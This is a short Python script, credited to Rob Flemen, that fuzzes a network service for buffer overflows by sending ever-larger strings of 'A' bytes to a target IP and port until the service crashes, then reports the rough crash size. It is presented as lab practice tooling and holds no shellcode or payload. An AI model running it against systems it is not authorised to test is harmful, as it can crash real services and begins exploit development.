#!/usr/bin/python3
# Application fuzzer for crashing apps for simple buffer overflow practice
# NOTE: This is an around about offset, you should not rely on this alone, 
# you need to do pattern matching to find exact offset!
#
# Written by Rob Flemen
# 12/24/2025

import socket
import sys
from time import sleep
import argparse

# Setup arguments and parser
parser = argparse.ArgumentParser(description="A script that fuzzes an app for buffer overflow.")
parser.add_argument("--ip", required=True, help="Target IP")
parser.add_argument("--port", required=True, type=int, help="Target port")
parser.add_argument("--prefix", default="", help="OPTIONAL: buffer prefix (e.g. 'TRUN .')")
parser.add_argument("--bytes", default=10, type=int, help="OPTIONAL: Bytes to send in payload and increment (Default = 10)")
args = parser.parse_args()

# Input validation for --bytes optional argument
if args.bytes <= 0:
    print("[\033[91mx\033[00m]Bytes must be greater than 0")
    sys.exit(1)

# Setup payload size and increment, default is 10 if not specified by user 
# 10 is sweet spot if you ask me :)
payload_size = args.bytes
payload_increment = args.bytes

while True:
    try:

        # Create socket per attempt
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((args.ip, args.port))

        # Rebuild buffer every iteration and send output to screen
        buffer = args.prefix.encode()
        buffer += b"A" * payload_size
        buffer += b"\r\n"
        print(f"[\033[94mStatus:\033[00m] Fuzzing with {len(buffer)} total bytes")

	    # send buffer (bytes for python3)
        s.send(buffer)
        s.close()

	    # Increment payload and wait so we don't flood
        payload_size += payload_increment
        sleep(0.25)

    except Exception as e:
    
        print(f"[\033[92m\N{CHECK MARK}\033[00m] Fuzzer crashed at around {len(buffer)} bytes")
        print(f"[\033[92m\N{CHECK MARK}\033[00m][\033[91mError:\033[00m]{e}")
        sys.exit(0)
